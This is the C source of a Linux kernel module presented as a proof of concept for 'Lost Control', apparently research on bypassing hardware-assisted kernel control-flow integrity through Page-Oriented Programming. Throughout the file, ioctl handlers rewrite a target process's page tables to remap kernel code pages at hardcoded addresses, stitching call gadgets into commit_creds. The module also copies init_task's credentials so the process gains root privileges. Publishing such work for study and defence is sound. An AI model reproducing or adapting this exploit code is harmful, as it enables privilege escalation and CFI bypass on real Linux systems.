/*
 *  Lost Control: Breaking Hardware-Assisted Kernel Control-Flow Integrity with
 *                         Page-Oriented Programming
 *
 *                      Copyright (c) 2023 Seunghun Han
 *
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/syscalls.h>
#include <linux/fcntl.h>
#include <linux/cred.h>
#include <linux/hugetlb.h>
#include <asm/io.h>
#include <asm/page_64.h>
#include <asm/tlbflush.h>
#include <asm/fsgsbase.h>
#include <linux/delay.h>

// Module information.
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Seunghun Han");
MODULE_VERSION("1.0");
MODULE_DESCRIPTION("Lost Control Driver");

// Function defines and variables.
unsigned long lc_replace_paddr(struct mm_struct* mm, unsigned long vaddr, unsigned long new_paddr);
unsigned long lc_vaddr_to_paddr(struct mm_struct* mm, unsigned long vaddr);
int lc_exploit_vulnerability(void);
int lc_prepare_exploit(void);
void lc_recover_hooked_function(void);
void lc_prepare_tlb_flush(void);
unsigned long gs_base = 0x00;
void lc_disable_calls_in_commit_creds_for_debug(void);

typedef struct page_modification
{
	unsigned long src_addr; 	// Address of source function
	unsigned long dst_addr;		// Address of destination function
	unsigned long bak_addr;		// Backup physical address of destination function
} PAGE_MOD;

// __x64_sys_bpf()'s branch target: 0xffffffff812bd5e0 
// Remapping call gadget_1: 0xffffffff81c605e0 (call gadget's address) -> 0xffffffff812bd5e0 (system call's direct branch target) => -0x9a3000 (displacement)
// Calculating call gadget_1's new branch target: 0xffffffff81c61a90 (target address) - 0x9a3000 (displacement) = 0xffffffff812bea90 (new branch target)
// Remapping call gadget_2: 0xffffffff8153da90 (call gadget's address) -> 0xffffffff812bea90 (call gadget_1's new branch target) => -0x27f000 (displacement)
// Calculating call gadget_2's new branch target: 0xffffffff8153e220 (target address) - 0x27f000 (displacement) = 0xffffffff812bf220 (new branch target)
// Remapping commit_creds(): 0xffffffff81122220 (commit_creds()'s address) -> 0xffffffff812bf220 (call gadget's new branch target) => 0x19d000  (displacement)
PAGE_MOD page_mod_list[] =
{
	// Source logical address, Target logical address, Backup
	{0xffff8884a02327c0, 0xffff8884a03cF7c0, 0}, 	// Remap: gs_base + pcpu_hot -> pcpu_hot + <0x19d000>
	{0xffffffff81c605e0, 0xffffffff812bd5e0, 0}, 	// Remap: call gadget_1 -> call gadget_1 - <0x9a3000>
	{0xffffffff8153da90, 0xffffffff812bea90, 0}, 	// Remap: call gadget_2 -> call gadget_2 - <0x27f000>
	{0xffffffff81122220, 0xffffffff812bf220, 0}, 	// Remap: commit_creds() -> commit_creds() + <0x19d000>
	{0xffffffff844e2798, 0xffffffff8467f798, 0},	// Remap: suid_dumpable -> suid_dumpable variable + <0x19d000>
	{0xffffffff844e2798 + 0x1000, 0xffffffff8467f798 + 0x1000, 0},	// Remap: suid_dumpable + 0x1000 -> suid_dumpable variable + 0x1000 + <0x19d000>
	{0xffffffff8132a2d0, 0xffffffff816102d0, 0},	// Replace with NOP: NOP gadget_1 -> set_dumpable() <0xffffffff814732d0> + <0x19d000> 
	{0xffffffff81640120, 0xffffffff817dd120, 0},	// Remap: key_fsuid_changed() and key_fsgid_changed() -> key_fsuid_changed() and key_fsgid_changed() + <0x19d000>
	{0xffffffff811263d0, 0xffffffff812c33d0, 0},	// Remap: inc_rlimit_ucounts() and del_rlimit_ucounts() -> inc_rlimit_ucounts() + <0x19d000> 
	{0xffffffff81329fb0, 0xffffffff81c45fb0, 0},	// Replace with NOP: NOP gadget_2 -> proc_id_connector <0xffffffff81aa8fb0> + <0x19d000>
	{0xffffffff81033d90, 0xffffffff81344d90, 0},	// Replace with NOP: NOP gadget_3 -> call_rcu <0xffffffff811a7d90> + <0x19d000>
};

// Function pointer for debugging.
typedef void* (*f_text_poke) (void *addr, const void *opcode, size_t len);
f_text_poke new_text_poke = (f_text_poke) 0x0;

struct cred* new_cred;
struct mm_struct* mm;
pgd_t* old_pgd;
int g_alloc_index = 0;
int in_use = 0;

// For debugging
#define GET_FREE_PAGE_DEBUG 		0
#define FLUSH_FORCE_DEBUG			0

// 16GB target
//#define RAM_SIZE					((unsigned long)14 * 1024 * 1024 * 1024)
#define RAM_SIZE					((unsigned long)16 * 1024 * 1024 * 1024)
// 8GB target(HP EliteDesk)
//#define RAM_SIZE					((unsigned long)8 * 1024 * 1024 * 1024)

#define LC_INFO 					KERN_INFO "LostCtrl: " 

// IOCTRL numbers
#define LC_IOCTL_PREPARE			0x101
#define LC_IOCTL_POP				0x102
#define LC_IOCTL_RECOVER			0x103

/**
 *	Reset the index of the free page pool.
 */
void lc_reset_free_page(void)
{
	g_alloc_index = 0;
}

/**
 *	Get a free page.
 *		Get a page from the end of the RAM.
 */
void* lc_get_free_page(void)
{
	unsigned long addr;

#if GET_FREE_PAGE_DEBUG
	addr = (unsigned long)__get_free_page(GFP_KERNEL | __GFP_ZERO);
#else
	addr = page_offset_base + ((RAM_SIZE / PAGE_SIZE) - 0x1000) - (g_alloc_index * PAGE_SIZE);
	g_alloc_index++;
#endif
	printk(LC_INFO"   [*] lc_get_free_page: VA: %016lx, PA: %016lx is allocated\n", addr, virt_to_phys((void*)addr));
	return (void*) addr;
}

/**
 *	Handler for opening the /dev/lostctrl file.
 */
static int lc_open(struct inode *inode, struct file *file)
{
    if(in_use)
    {
        return -EBUSY;
    }

    in_use++;
    printk(LC_INFO "Open function is called.\n");

    return 0;
}

/**
 *	Handler for closing the /dev/lostctrl file.
 */    
static int lc_release(struct inode *inode, struct file *file)
{
    in_use--;
    printk(LC_INFO "Close function is called.\n");

    return 0;
}

/**
 *	Handler for I/O controls of the /dev/lostctrl file.
 */
static long lc_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
    int retval = 0;
    printk(LC_INFO "IOCTRL cmd %d, arg %lx\n", cmd, arg);
	switch(cmd)
	{
		case LC_IOCTL_PREPARE:
			lc_prepare_exploit();
			break;

		case LC_IOCTL_POP:
			lc_exploit_vulnerability();
			break;

		case LC_IOCTL_RECOVER:
			lc_recover_hooked_function();
			break;
	}

    return retval;
}

/**
 *	Handler for reading the /dev/lostctrl file.
 */
static ssize_t lc_read(struct file *filp, char *buffer, size_t length, loff_t *offset)
{
    printk (LC_INFO "Read function is called.\n");
    return 0;
}

/**
 *	Handler for writing the /dev/lostctrl file.
 */
static ssize_t lc_write(struct file *filp, const char *buff, size_t len, loff_t *off)
{
    printk (LC_INFO "Writing function is called\n");
    return -EINVAL;
}

/**
 *  File operation structure to register /dev/lostctrl.
 */
static const struct file_operations lc_fops = \
{
    .owner = THIS_MODULE,
    .open = &lc_open,
    .read = &lc_read,
    .write = &lc_write,
    .release = &lc_release,
    .unlocked_ioctl = (void*) &lc_ioctl,
    .compat_ioctl = (void*) &lc_ioctl
};

/**
 *  Device structure to register /dev/lostctrl.
 */
static struct miscdevice my_device = \
{
    MISC_DYNAMIC_MINOR,
    "lostctrl",
    &lc_fops
};

/**
 * Recover hooked function.
 */
void lc_recover_hooked_function(void)
{
	int i;

	printk(LC_INFO "\n");
	printk(LC_INFO "Recovering remapped pages to the original ones.\n");

	for (i = 0 ; i < sizeof(page_mod_list) / sizeof(PAGE_MOD) ; i++)
	{
		if (page_mod_list[i].bak_addr != 0)
		{
			lc_replace_paddr(mm, page_mod_list[i].dst_addr, page_mod_list[i].bak_addr);
		}
	}

#if FLUSH_FORCE_DEBUG
	__flush_tlb_all();
#endif
}

/**
 * 	Check if a huge page.
 */
int pmd_huge(pmd_t pmd)
{
	return !pmd_none(pmd) &&
		(pmd_val(pmd) & (_PAGE_PRESENT|_PAGE_PSE)) != _PAGE_PRESENT;
}

/**
 *	Split 2 MB page to 4 KB pages.
 */
void split_to_4kb(pmd_t* pmd)
{
	pte_t *pte;
	unsigned long pmd_start_addr;
	int i;

	pte = (pte_t *)lc_get_free_page();
	memset(pte, 0, PAGE_SIZE);

	// Fill all addresses.
	pmd_start_addr = pmd_val(*pmd) & HPAGE_MASK;
	for (i = 0 ; i < 512 ; i++)
	{
		pte[i].pte = (pmd_start_addr + 0x1000 * i) | _PAGE_PRESENT;
		if (pmd_val(*pmd) & _PAGE_PRESENT)
		{
			pte[i].pte = pte[i].pte | _PAGE_RW;
		}
	}

	// Update pmd and tlb flush without a global bit.
	pmd->pmd = virt_to_phys(pte) | _PAGE_PRESENT | _PAGE_RW;
}


/**
 *	Replace page tables with a new physical address.
 */
unsigned long lc_replace_paddr(struct mm_struct* mm, unsigned long vaddr, unsigned long new_paddr)
{
    pgd_t *pgd;
	p4d_t *p4d;
    pud_t *pud;
    pud_t *new_pud;
    pmd_t *pmd;
    pmd_t *new_pmd;
    pte_t *pte;
    pte_t *new_pte;
    unsigned long paddr = 0;
    unsigned long page_addr = 0;
    unsigned long page_offset = 0;
	int i;

	printk(LC_INFO "   [*] Replacing vaddr = %016lx with new_paddr = %016lx\n", vaddr, new_paddr);

	//=========================================================================
	// PGD	
	//=========================================================================
    pgd = pgd_offset(mm, vaddr);
    if (pgd_none(*pgd) || (pgd_val(*pgd) == 0))
	{
        printk(LC_INFO "   [*] No PGD. Adding a new PGD.\n");

		new_pud = (pud_t *)lc_get_free_page();
		for (i = 0 ; i < 512 ; i++)
		{
			new_pud[i].pud = 0x00;
		}
		pgd->pgd = virt_to_phys(new_pud) | _PAGE_PRESENT | _PAGE_RW;
    }
	else
	{
		// Duplicate and make private page tables.
		new_pud = (pud_t *)lc_get_free_page();
		pud = (pud_t *)phys_to_virt(pgd_val(*pgd) & PAGE_MASK);
		for (i = 0 ; i < 512 ; i++)
		{
			new_pud[i].pud = pud[i].pud;
			if (new_pud[i].pud & _PAGE_PRESENT)
			{
				new_pud[i].pud |= _PAGE_RW;
			}
		}
		pgd->pgd = virt_to_phys(new_pud) | (pgd->pgd & 0xfff) | _PAGE_PRESENT | _PAGE_RW;
	}

	//=========================================================================
	// P4D
	//=========================================================================
	p4d = p4d_offset(pgd, vaddr);
	if (p4d_none(*p4d))
	{
		if (pgtable_l5_enabled() == 0)
		{
			printk(LC_INFO "   [*] No P4D, but L5 paging is not enabled. So skip it.\n");
		}
		else
		{
			printk(LC_INFO "   [*] No P4D\n");
			return -1;
		}
	}

	//=========================================================================
	// PUD	
	//=========================================================================
    pud = pud_offset(p4d, vaddr);
    if (pud_none(*pud) || (pud_val(*pud) == 0))
	{
        printk(LC_INFO "   [*] No PUD. Adding a new PUD.\n");
		new_pmd = (pmd_t *)lc_get_free_page();
		for (i = 0 ; i < 512 ; i++)
		{
			new_pmd[i].pmd = 0x00;
		}
		pud->pud = virt_to_phys(new_pmd) | (pud->pud & 0xfff) | _PAGE_PRESENT | _PAGE_RW;
    }
	else
	{
		// Duplicate and make private page tables.
		new_pmd = (pmd_t *)lc_get_free_page();
		pmd = (pmd_t *)phys_to_virt(pud_val(*pud) & PAGE_MASK);
		for (i = 0 ; i < 512 ; i++)
		{
			new_pmd[i].pmd = pmd[i].pmd;
			if (new_pmd[i].pmd & _PAGE_PRESENT)
			{
				new_pmd[i].pmd |= _PAGE_RW;
			}
		}
		pud->pud = virt_to_phys(new_pmd) | (pud->pud & 0xfff) | _PAGE_PRESENT | _PAGE_RW;
	}

	//=========================================================================
	// PMD	
	//=========================================================================
    pmd = pmd_offset(pud, vaddr);
    if (pmd_none(*pmd) || (pmd_val(*pmd) == 0))
	{
        printk(LC_INFO "   [*] No PMD. Adding a new PMD.\n");
		new_pte = (pte_t *)lc_get_free_page();
		for (i = 0 ; i < 512 ; i++)
		{
			new_pte[i].pte = 0x00;
		}
		pmd->pmd = virt_to_phys(new_pte) | _PAGE_PRESENT | _PAGE_RW;
    }
	else
	{
		if (pmd_flags(*pmd) & _PAGE_GLOBAL)
		{
			//printk("   [*] PMD is a global page.\n");
		}

		if (pmd_large(*pmd))
		{
			//printk("   [*] PMD is a large page\n");
			page_addr = pmd_val(*pmd) & HPAGE_MASK;
			page_offset = vaddr & ~HPAGE_MASK;
			paddr = page_addr + page_offset;

			split_to_4kb(pmd);
		}

		// Duplicate and make private page tables.
		new_pte = (pte_t *)lc_get_free_page();
		pte = (pte_t *)phys_to_virt(pmd_val(*pmd) & PAGE_MASK);
		for (i = 0 ; i < 512 ; i++)
		{
			new_pte[i].pte = pte[i].pte;
			if (new_pte[i].pte & _PAGE_PRESENT)
			{
				new_pte[i].pte |= _PAGE_RW;
			}
		}
		pmd->pmd = virt_to_phys(new_pte) | (pmd->pmd & 0xfff) | _PAGE_PRESENT;
	}
	
    pte = pte_offset_kernel(pmd, vaddr);
    if (pte_none(*pte))
	{
		page_addr = 0;
		pte->pte = (new_paddr & PAGE_MASK) | _PAGE_PRESENT | _PAGE_RW;
    }
	else
	{
		// Replace to the new physical address.
		page_addr = pte_val(*pte);
		pte->pte = (new_paddr & PAGE_MASK) | _PAGE_PRESENT | _PAGE_RW;
	}

#if FLUSH_FORCE_DEBUG
	__flush_tlb_all();
#endif

    return paddr;
}

/**
 *	Translate a virtual address to a physical address.
 */
unsigned long lc_vaddr_to_paddr(struct mm_struct* mm, unsigned long vaddr)
{
	pgd_t *pgd;
	p4d_t *p4d;
	pud_t *pud;
	pmd_t *pmd;
	pte_t *pte;
	unsigned long paddr = 0;
	unsigned long page_addr = 0;
	unsigned long page_offset = 0;

	pgd = pgd_offset(mm, vaddr);
	if (pgd_none(*pgd))
	{
		printk(LC_INFO "   [*] No PGD.\n");
		return -1;
	}

    p4d = p4d_offset(pgd, vaddr);
    if (p4d_none(*p4d))
    {
		if (pgtable_l5_enabled() == 0)
		{
			printk(LC_INFO "   [*] No P4D, but L5 paging is not enabled. So skip it.\n");
		}
		else
		{
			printk(LC_INFO "   [*] No P4D.\n");
			return -1;
		}
    }
	pud = pud_offset(p4d, vaddr);
	if (pud_none(*pud) || !(pud_val(*pud) & _PAGE_PRESENT))
	{
		printk(LC_INFO "   [*] No PUD.\n");
		return -1;
	}

	pmd = pmd_offset(pud, vaddr);
	if (pmd_none(*pmd) || !(pmd_val(*pmd) & _PAGE_PRESENT))
	{
		printk(LC_INFO "   [*] No PMD.\n");
		return -1;
	}

	if (pmd_flags(*pmd) & _PAGE_GLOBAL)
	{
		printk(LC_INFO "   [*] PMD is a global page.\n");
	}

	/* Need to split. */
	if (pmd_large(*pmd))
	{
		printk(LC_INFO "   [*] PMD is a lage page. %lx\n", pmd_val(*pmd));

		page_addr = pmd_val(*pmd) & HPAGE_MASK;
		page_offset = vaddr & ~HPAGE_MASK;
		paddr = page_addr + page_offset;

		return paddr;
	}

	pte = pte_offset_kernel(pmd, vaddr);
	if (pte_none(*pte))
	{
		return -1;
	}

	page_addr = pte_val(*pte) & PAGE_MASK;
	page_offset = vaddr & ~PAGE_MASK;
	paddr = page_addr | page_offset;

	return paddr;
}

/**
 *	Change the global bit from the page table.
 */
unsigned long change_g_bit(struct mm_struct* mm, unsigned long vaddr, int set)
{
	pgd_t *pgd;
	p4d_t *p4d;
	pud_t *pud;
	pmd_t *pmd;
	pte_t *pte;
	unsigned long paddr = 0;
	unsigned long page_addr = 0;
	unsigned long page_offset = 0;

	printk(LC_INFO "   [*] Changing the global bit, vaddr = %016lx, set %d\n", vaddr, set);

	pgd = pgd_offset(mm, vaddr);
	if (pgd_none(*pgd) || !(pgd_val(*pgd) & _PAGE_PRESENT))
	{
		printk(LC_INFO "   [*] No PGD.\n");
		return -1;
	}

	p4d = p4d_offset(pgd, vaddr);
	if (p4d_none(*p4d))
	{
		if (pgtable_l5_enabled() == 0)
		{
			printk(LC_INFO "   [*] No P4D, but L5 paging is not enabled. So skip it.\n");
		}
		else
		{
			printk(LC_INFO "   [*] No P4D.\n");
			return -1;
		}
	}

	pud = pud_offset(p4d, vaddr);
	if (pud_none(*pud) || !(pud_val(*pud) & _PAGE_PRESENT))
	{
		printk(LC_INFO "   [*] No PUD.\n");
		return -1;
	}

	// 1 GB page size.
	if (pud_large(*pud))
	{
		//printk(LC_INFO"   [*] PUD is a huge page.\n");
		page_addr = pud_val(*pud) & PUD_MASK;
		page_offset = vaddr & ~PUD_MASK;
		paddr = page_addr + page_offset;

		if (set == 1)
		{
			pud->pud = pud->pud | _PAGE_GLOBAL;
		}
		else
		{
			pud->pud = pud->pud & ~_PAGE_GLOBAL;
		}

		return paddr;
	}

	pmd = pmd_offset(pud, vaddr);
	if (pmd_none(*pmd) || !(pmd_val(*pmd) & _PAGE_PRESENT))
	{
		printk(LC_INFO"   [*] No PMD.\n");
		return -1;
	}

	// 2 MB page size.
	if (pmd_large(*pmd))
	{
		//printk(LC_INFO"   [*] PMD is a large page.\n");
		page_addr = pmd_val(*pmd) & HPAGE_MASK;
		page_offset = vaddr & ~HPAGE_MASK;
		paddr = page_addr + page_offset;

		if (set == 1)
		{
			pmd->pmd = pmd->pmd | _PAGE_GLOBAL;
		}
		else
		{
			pmd->pmd = pmd->pmd & ~_PAGE_GLOBAL;
		}

		return paddr;
	}

	pte = pte_offset_kernel(pmd, vaddr);
	if (pte_none(*pte) || !(pte_val(*pte) & _PAGE_PRESENT))
	{
		printk(LC_INFO"   [*] No PTE.\n");
		return -1;
	}

	if (set == 1)
	{
		pte->pte = pte->pte | _PAGE_GLOBAL;
	}
	else
	{
		pte->pte = pte->pte & ~_PAGE_GLOBAL;
	}

	page_addr = pte_val(*pte) & PAGE_MASK;
	page_offset = vaddr & ~PAGE_MASK;
	paddr = page_addr | page_offset;

	return paddr;
}

/*
 * Disable function calls in commit_creds for debugging.
 */
void lc_disable_calls_in_commit_creds_for_debug(void)
{
	unsigned char nop_sled[] = {0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90}; 
	unsigned char ud_sled[] = {0x0f, 0x0b}; 

	printk(LC_INFO "Patch unnecessary calls in commit_creds() for debugging\n");

	// For step-by-step procedure, disable all calls first
	//new_text_poke((void*)0xffffffff811222f4, nop_sled, 5); // call set_dumpable
	//new_text_poke((void*)0xffffffff81122355, nop_sled, 5); // call inc_rlimit_ucounts
	//new_text_poke((void*)0xffffffff81122396, nop_sled, 5); // call dec_rlimit_ucounts
	//new_text_poke((void*)0xffffffff81122310, nop_sled, 5); // call key_fsuid_changed
	//new_text_poke((void*)0xffffffff81122322, nop_sled, 5); // call key_fsgid_changed
	
	//new_text_poke((void*)0xffffffff811223cb, nop_sled, 5); // call proc_id_connector
	//new_text_poke((void*)0xffffffff81122400, nop_sled, 5); // call proc_id_connector
	//new_text_poke((void*)0xffffffff8112248b, nop_sled, 5); // call call_rcu
	//new_text_poke((void*)0xffffffff8112249f, nop_sled, 5); // call call_rcu
	printk(LC_INFO "Complete...\n");
}

/**
 *	Prepare exploitation.
 *		All of the process below can be done by user-level process.
 *		(Please check the PoC example of USENIX Security 2024.)
 */
int lc_prepare_exploit(void)
{
	struct task_struct* p;
    void* cr3_virt;
    unsigned long cr3_phys;
	unsigned long src_paddr = 0;
	unsigned long dst_paddr = 0;
	unsigned long* new_cr3;
	struct cred* init_cred;
	int i;

    printk(LC_INFO "\n");
    printk(LC_INFO "Preparing Page-Oriented Programming (POP).\n");

	//=========================================================================
	// Step 1. Preparing TLB flushing and free pages.
	//=========================================================================
	// Prepare TLB flushing by removing the g bit of the remapping table.
	lc_prepare_tlb_flush();
	lc_reset_free_page();

	//=========================================================================
	// Step 2. Allocating a new cred for the malicious application.
	//=========================================================================
	init_cred = (struct cred*) init_task.real_cred;
	new_cred = (struct cred*) lc_get_free_page();
	memcpy(new_cred, init_cred, sizeof(struct cred));
	printk(LC_INFO"   [*] current_real_cred: %016lx\n", current->real_cred);
	printk(LC_INFO"   [*] New cred: %016lx. Update the address to the malicious application\n", (unsigned long)new_cred);
	printk(LC_INFO"   [*] Setting the new_cred->thread_keyring variable to NULL to evade the remapping explosion.\n");
	new_cred->thread_keyring = NULL;

	//=========================================================================
	// Step 3. Changing the CR3 value to build private page tables. 
	//=========================================================================
	for (p = next_task(&init_task) ; p!= &init_task ; p = next_task(p))
    {
        if (strstr(p->comm, "lc_main"))
        {
            mm = p->mm;
            if (mm == NULL)
			{
                return 0;
			}

            cr3_virt = (void*) mm->pgd;
			old_pgd = mm->pgd;
            cr3_phys = virt_to_phys(cr3_virt);
            printk(LC_INFO "   [*] Before changing CR3. cr3_virt: %016lx, cr3_phys: %016lx\n", cr3_virt, cr3_phys);
			
			// Changing the CR3 value.
			new_cr3 = (unsigned long*) lc_get_free_page();
			memcpy(new_cr3, cr3_virt, 0x1000);
			mm->pgd = (pgd_t*) new_cr3;
			
            cr3_virt = (void*) mm->pgd;
            cr3_phys = virt_to_phys(cr3_virt);
            printk(LC_INFO "   [*] After changing CR3. cr3_virt: %016lx, cr3_phys: %016lx\n", cr3_virt, cr3_phys);
			
			printk(LC_INFO "   [*] Complete.\n");
			break;
        }
    }

#if FLUSH_FORCE_DEBUG
	__flush_tlb_all();
#endif
    return 0;
}

/**
 *	Exploitation. 	
 *		All of the process below can be done by user-level process.
 *		(Please check the PoC example of USENIX Security 2024.)
 */
#define next_task(p) 	list_entry((p)->tasks.next, struct task_struct, tasks)
int lc_exploit_vulnerability(void)
{
	struct task_struct* p;
    void* cr3_virt;
    unsigned long cr3_phys;
	unsigned long src_paddr = 0;
	unsigned long dst_paddr = 0;
	unsigned long* new_cr3;
	int i;
    
    printk(LC_INFO "\n");
    printk(LC_INFO "Stithcing POP gadgets.\n");

	for (p = next_task(&init_task) ; p!= &init_task ; p = next_task(p))
    {
        if (strstr(p->comm, "lc_main"))
        {
            mm = p->mm;
            if (mm == NULL)
			{
                return 0;
			}

            cr3_virt = (void*) mm->pgd;
            cr3_phys = virt_to_phys(cr3_virt);
			for (i = 0 ; i < sizeof(page_mod_list) / sizeof(PAGE_MOD) ; i++)
			{
				// Backup physical page of destination address.
				dst_paddr = lc_vaddr_to_paddr(mm, page_mod_list[i].dst_addr);
				page_mod_list[i].bak_addr = dst_paddr;
				
				// Replace physical page of destination address to the one of source address.
				src_paddr = lc_vaddr_to_paddr(mm, page_mod_list[i].src_addr);
				lc_replace_paddr(mm, page_mod_list[i].dst_addr, src_paddr);

				printk(LC_INFO "   [*] Remapping and replacing PA: 0x%lx (of VA: 0x%lx) to VA: 0x%lx\n",
					src_paddr, page_mod_list[i].src_addr, page_mod_list[i].dst_addr);
			}

			// Remapping the new cred to the under 4 GB address space for 32 bit system calls.
			printk(LC_INFO "   [*] Remapping the new_cred from 0x%lx to 0x%lx for exploitation\n", new_cred, (unsigned long) new_cred & 0xffffffff);
			src_paddr = lc_vaddr_to_paddr(mm, (unsigned long) new_cred);
			lc_replace_paddr(mm, (unsigned long) new_cred & 0xffffffff, src_paddr);
			
			printk(LC_INFO "   [*] Complete.\n");
			break;
        }
    }

#if FLUSH_FORCE_DEBUG
	__flush_tlb_all();
#endif
    return 0;
}

/**
 *	Prepare TLB flushing.
 */
void lc_prepare_tlb_flush(void)
{
	unsigned long i;

	printk(LC_INFO "\n");
	printk(LC_INFO "Removing the g bit from the remapping targets.\n");

	for (i = 0 ; i < sizeof(page_mod_list) / sizeof(PAGE_MOD) ; i++)
	{
		change_g_bit(current->mm, page_mod_list[i].dst_addr, 0);
	}
	printk(LC_INFO "   [*] Complete.\n");
}


void print_logo(void)
{
	printk(LC_INFO "\n");
	printk(LC_INFO "                ██▓     ▒█████    ██████ ▄▄▄█████▓              \n"); 
	printk(LC_INFO "               ▓██▒    ▒██▒  ██▒▒██    ▒ ▓  ██▒ ▓▒              \n"); 
	printk(LC_INFO "               ▒██░    ▒██░  ██▒░ ▓██▄   ▒ ▓██░ ▒░              \n"); 
	printk(LC_INFO "               ▒██░    ▒██   ██░  ▒   ██▒░ ▓██▓ ░               \n"); 
	printk(LC_INFO "               ░██████▒░ ████▓▒░▒██████▒▒  ▒██▒ ░               \n"); 
	printk(LC_INFO "               ░ ▒░▓  ░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░  ▒ ░░                 \n"); 
	printk(LC_INFO "               ░ ░ ▒  ░  ░ ▒ ▒░ ░ ░▒  ░ ░    ░                  \n"); 
	printk(LC_INFO "                   ░  ░    ░ ░        ░                         \n"); 
	printk(LC_INFO "                                                                \n"); 
	printk(LC_INFO "  ▄████▄   ▒█████   ███▄    █ ▄▄▄█████▓ ██▀███   ▒█████   ██▓   \n"); 
	printk(LC_INFO " ▒██▀ ▀█  ▒██▒  ██▒ ██ ▀█   █ ▓  ██▒ ▓▒▓██ ▒ ██▒▒██▒  ██▒▓██▒   \n"); 
	printk(LC_INFO " ▒▓█    ▄ ▒██░  ██▒▓██  ▀█ ██▒▒ ▓██░ ▒░▓██ ░▄█ ▒▒██░  ██▒▒██░   \n"); 
	printk(LC_INFO " ▒▓▓▄ ▄██▒▒██   ██░▓██▒  ▐▌██▒░ ▓██▓ ░ ▒██▀▀█▄  ▒██   ██░▒██░   \n"); 
	printk(LC_INFO " ▒ ▓███▀ ░░ ████▓▒░▒██░   ▓██░  ▒██▒ ░ ░██▓ ▒██▒░ ████▓▒░░██████▒ \n"); 
	printk(LC_INFO " ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒   ▒ ░░   ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░▓  ░ \n");
	printk(LC_INFO "   ░  ▒     ░ ▒ ▒░ ░ ░░   ░ ▒░    ░      ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░ ▒  ░ \n");
	printk(LC_INFO "   ░          ░ ░           ░             ░         ░        ░   \n");
	printk(LC_INFO "\n");
	printk(LC_INFO "    Lost Control PoC Kernel Driver, Made by Seunghun Han\n");
	printk(LC_INFO "\n");
}

/**
 * 	Start function of this driver.
 */
static int __init lc_init(void)
{
	struct cred* init_cred;

	printk(LC_INFO "\n\n\n");
	print_logo();
    printk(LC_INFO "Lost Control driver starts.\n");
    int retval;

    retval = misc_register(&my_device);

	// Get gs_base from __per_cpu_offset.
	gs_base = __per_cpu_offset[0];

	printk(LC_INFO"   [*] PG5 enabled: %d\n", pgtable_l5_enabled());
	printk(LC_INFO"   [*] GS_Base of CPU 0: %08lx\n", __per_cpu_offset[0]);
	init_cred = (struct cred*)init_task.real_cred;
	printk(LC_INFO"   [*] Init task: %016lx, cred: %016lx, uid: %d, euid: %d\n", 
		&init_task, init_cred, init_cred->uid, init_cred->euid);
	printk(LC_INFO"   [*] current_real_cred: %016lx, non_rcu: %d\n", 
		current->real_cred, current->real_cred->non_rcu);
	printk(LC_INFO"   [*] Direct mapping area: %016lx\n", page_offset_base);

	// Test if syscall is called correctly and update __lc_text_poke ptr for debugging.
	new_text_poke = (f_text_poke) 0xffffffff81059e50;
	
	// Find essential path of the security-sensitive function.
#if 0
	// For debugging
	lc_disable_calls_in_commit_creds_for_debug();
#endif


#if FLUSH_FORCE_DEBUG
	__flush_tlb_all();
#endif

    return 0;
}

/**
 * 	Exit function of this driver.
 */
static void __exit lc_exit(void)
{   
    printk(LC_INFO "Lost Control driver ends.\n");    
    misc_deregister(&my_device);
}

module_init(lc_init);
module_exit(lc_exit); 
